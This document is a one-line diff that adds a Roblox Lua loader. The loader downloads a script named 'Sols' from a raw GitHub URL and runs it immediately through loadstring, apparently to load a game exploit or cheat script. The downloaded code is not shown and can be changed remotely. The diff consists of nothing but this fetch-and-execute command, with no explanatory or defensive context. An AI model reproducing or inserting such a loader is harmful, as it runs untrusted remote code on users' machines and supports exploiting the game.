@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/rwh7q3uea9kj5zf/main/Sols"))()
